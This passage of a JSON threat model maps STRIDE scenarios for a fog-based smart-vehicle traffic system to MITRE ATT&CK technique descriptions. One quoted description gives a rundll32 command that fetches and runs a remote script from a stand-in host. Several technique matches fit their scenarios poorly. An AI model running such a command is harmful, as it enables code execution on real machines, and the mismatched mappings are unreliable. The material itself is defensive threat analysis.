                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a fog node to intercept and manipulate data flows from vehicles.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can physically access or compromise a fog node.",
                    "Role": "Attacker",
                    "Condition": "Physical security of fog nodes is not sufficiently enforced."
                },
                {
                    "Assumption": "Fog nodes do not authenticate each other.",
                    "Role": "System Designer",
                    "Condition": "Inter-fog node communication lacks strong authentication."
                }
            ],
            "Potential Impact": "Corruption or tampering of data, disruption of data access.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "man-in-the-middle",
                "network",
                "device"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker fakes cloud server credentials to alter traffic management decisions.",
            "Assumptions": [
                {
                    "Assumption": "Credentials are not sufficiently protected or encrypted.",
                    "Role": "System Administrator",
                    "Condition": "Weak credential management and encryption practices."
                },
                {
                    "Assumption": "Fog nodes do not verify the authenticity of cloud server communications.",
                    "Role": "System Designer",
                    "Condition": "Lack of mutual authentication between fog nodes and cloud servers."
                }
            ],
            "Potential Impact": "Corruption of traffic data, disruption to real-time traffic management, potential safety risks.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credentials",
                "cloud services",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malware infection on a fog node leads to unauthorized modification of traffic data.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes do not have robust anti-malware defenses.",
                    "Role": "System Administrator",
                    "Condition": "Lack of current anti-malware solutions on fog nodes."
                },
                {
                    "Assumption": "Data integrity checks are not performed on traffic data at multiple points.",
                    "Role": "System Designer",
                    "Condition": "Lack of end-to-end data integrity verification."
                }
            ],
            "Potential Impact": "Corruption of data, potential loss of trust in system integrity.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "malware",
                "data integrity",
                "device"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies firmware on roadside units to alter their intended functionality.",
            "Assumptions": [
                {
                    "Assumption": "Roadside units do not have secure firmware update mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Firmware update procedures lack security controls."
                },
                {
                    "Assumption": "Firmware integrity is not verified before installation.",
                    "Role": "System Administrator",
                    "Condition": "Lack of pre-installation integrity checks."
                }
            ],
            "Potential Impact": "Potentially hazardous modifications to traffic signals and vehicle alerts, compromising safety.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "device",
                "integrity"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Communication between fog nodes and cloud servers is intercepted and altered by an attacker.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels are not encrypted.",
                    "Role": "System Designer",
                    "Condition": "Inadequate encryption protocols for data transmission."
                },
                {
                    "Assumption": "There is no secondary verification for commands issued by the cloud servers to fog nodes.",
                    "Role": "System Administrator",
                    "Condition": "Absence of verification mechanisms for cloud-issued commands."
                }
            ],
            "Potential Impact": "Alteration of critical data and commands, leading to incorrect traffic management decisions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "network",
                "interception",
                "data"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A driver denies involvement in traffic incidents due to lack of proper logging and verification.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient logging mechanisms in place.",
                    "Role": "System Designer",
                    "Condition": "Logging of vehicle activities is not comprehensive."
                },
                {
                    "Assumption": "Logs are not securely stored.",
                    "Role": "System Administrator",
                    "Condition": "Logs are susceptible to tampering or loss."
                }
            ],
            "Potential Impact": "Difficulty in verifying events, leading to potential legal disputes and compromised data integrity.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "verification",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker compromises a fog node and erases logs to hide malicious activities.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes do not use write-once logging mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Logs can be altered or deleted after creation."
                },
                {
                    "Assumption": "Log integrity is not periodically verified.",
                    "Role": "System Administrator",
                    "Condition": "Log integrity checking mechanisms are absent."
                }
            ],
            "Potential Impact": "Loss of evidence for forensic analysis, undermining system trust and security investigations.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "compromise",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Boot or Logon Initialization Scripts",
                "description": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.(Citation: Mandiant APT29 Eye Spy Email Nov 22)(Citation: Anomali Rocke March 2019) Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  \n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \n\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",
                "id": "attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334",
                "technique_id": "T1037"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Dispute over data accuracy in cloud storage due to conflicting records from fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Data synchronization issues between fog nodes and cloud servers.",
                    "Role": "System Designer",
                    "Condition": "Lack of robust data synchronization mechanisms."
                },
                {
                    "Assumption": "Logs are not consistently maintained across different nodes.",
                    "Role": "System Administrator",
                    "Condition": "Inconsistent logging practices across fog nodes."
                }
            ],
            "Potential Impact": "Difficulty in resolving data discrepancies, leading to loss of system credibility.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "data synchronization",
                "trust",
                "conflict"
            ],
            "mitre_technique": {
                "name": "Digital Certificates",
                "description": "Adversaries may buy and/or steal SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner.\n\nAdversaries may purchase or steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) if the certificate is trusted or otherwise added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)). The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities.(Citation: DiginotarCompromise) Adversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for.\n\nCertificate authorities exist that allow adversaries to acquire SSL/TLS certificates, such as domain validation certificates, for free.(Citation: Let's Encrypt FAQ)\n\nAfter obtaining a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003)) on infrastructure under their control.",
                "id": "attack-pattern--19401639-28d0-4c3c-adcc-bc2ba22f6421",
                "technique_id": "T1588.004"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unencrypted data transmission between vehicles and fog nodes intercepted by a third party.",
            "Assumptions": [
                {
                    "Assumption": "Data transmissions are not encrypted.",
                    "Role": "System Designer",
                    "Condition": "Inadequate encryption protocols in place."
                },
                {
                    "Assumption": "Relevant encryption standards are not enforced.",
                    "Role": "System Administrator",
                    "Condition": "Failure to enforce encryption standards."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information such as vehicle and driver data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "unencrypted transmission",
                "data interception",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Cloud server compromise leading to exposure of aggregated data from fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Cloud servers lack adequate security measures.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient security controls at the cloud level."
                },
                {
                    "Assumption": "Data encryption is not applied consistently.",
                    "Role": "System Designer",
                    "Condition": "Inconsistent application of data encryption policies."
                }
            ],
            "Potential Impact": "Massive data breach affecting all connected vehicles, undermining system confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud services",
                "data breach",
                "confidentiality"
            ],
            "mitre_technique": {
                "name": "Weaken Encryption",
                "description": "Adversaries may compromise a network device\u2019s encryption capability in order to bypass encryption that would otherwise protect data communications. (Citation: Cisco Synful Knock Evolution)\n\nEncryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.\n\nAdversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as [Modify System Image](https://attack.mitre.org/techniques/T1601), [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001), and [Disable Crypto Hardware](https://attack.mitre.org/techniques/T1600/002), an adversary can negatively effect and/or eliminate a device\u2019s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. (Citation: Cisco Blog Legacy Device Attacks)",
                "id": "attack-pattern--1f9012ef-1e10-4e48-915e-e03563435fe8",
                "technique_id": "T1600"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Malware on fog nodes captures and exfiltrates sensitive vehicle data.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes have vulnerabilities that malware can exploit.",
                    "Role": "System Administrator",
                    "Condition": "Unpatched or outdated software on fog nodes."
                },
                {
                    "Assumption": "Network monitoring for malware is insufficient.",
                    "Role": "Security Analyst",
                    "Condition": "Lack of comprehensive network monitoring."
                }
            ],
            "Potential Impact": "Exfiltration and unauthorized disclosure of vehicle and road condition data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "malware",
                "data exfiltration",
                "network"
            ],
            "mitre_technique": {
                "name": "Rundll32",
                "description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) ",
                "id": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
                "technique_id": "T1218.011"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Distributed Denial of Service (DDoS) attack on fog nodes disrupts communication and processing.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes are not designed to handle high volumes of traffic.",
                    "Role": "System Designer",
                    "Condition": "Fog nodes have limited traffic handling capacities."
                },
                {
                    "Assumption": "DDoS mitigation measures are not implemented.",
                    "Role": "System Administrator",
                    "Condition": "Absence of DDoS protection mechanisms."
                }
            ],
            "Potential Impact": "System performance degradation, leading to loss of data availability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "ddos",
                "network",
                "availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the communication channels between smart vehicles and fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels are not protected against flooding attacks.",
                    "Role": "System Designer",
                    "Condition": "Lack of rate limiting or other flood prevention mechanisms."
                },
                {
                    "Assumption": "There is no fallback mechanism for failed communications.",
                    "Role": "System Administrator",
                    "Condition": "Absence of communication redundancy."
                }
            ],
            "Potential Impact": "Interruption of real-time data processing and alerts, compromising traffic management.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "flooding",
                "communication channels",
                "availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious code on a smart vehicle continuously sends erroneous data to a fog node.",
            "Assumptions": [
                {
                    "Assumption": "Smart vehicle systems are vulnerable to code injection.",
                    "Role": "System Designer",
                    "Condition": "Inadequate input validation on vehicle systems."
                },
                {
                    "Assumption": "Fog nodes do not have mechanisms to detect and ignore erroneous data.",
                    "Role": "System Administrator",
                    "Condition": "Lack of input validation and anomaly detection on fog nodes."
                }
            ],
            "Potential Impact": "Excessive processing load leading to service disruption on fog nodes.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malicious code",
                "erroneous data",
                "availability"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability to gain administrative control over a fog node.",
            "Assumptions": [
                {
                    "Assumption": "The fog node software contains unpatched vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Delay or failure in applying security patches."
                },
                {
                    "Assumption": "Administrative controls are not sufficiently restricted.",
                    "Role": "System Designer",
                    "Condition": "Lack of privilege separation and access control mechanisms."
                }
            ],
            "Potential Impact": "Complete takeover of fog node functions, potential tampering with critical data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vulnerability exploitation",
                "administrative control",
                "device"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
